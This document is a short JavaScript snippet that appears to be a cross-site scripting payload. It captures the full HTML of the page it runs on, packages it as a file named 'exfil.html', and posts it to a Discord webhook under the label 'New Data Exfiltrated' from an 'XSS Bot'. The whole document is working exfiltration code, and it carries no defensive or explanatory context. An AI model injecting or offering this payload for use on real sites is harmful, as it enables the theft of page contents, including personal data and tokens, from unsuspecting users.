(async () => {
    const webhookURL = "https://discord.com";
    
    // Capture the data (shortening it to fit Discord's 2000 char limit)
    // For full files, we'll send it as a 'file' instead of a message
    const pageData = document.documentElement.outerHTML;
    const blob = new Blob([pageData], { type: 'text/html' });
    const formData = new FormData();
    
    // Attach the data as a file called "exfil.html"
    formData.append('file', blob, 'exfil.html');
    formData.append('payload_json', JSON.stringify({
        content: "🚨 **New Data Exfiltrated**",
        username: "XSS Bot"
    }));

    fetch(webhookURL, {
        method: 'POST',
        body: formData
    });
})();
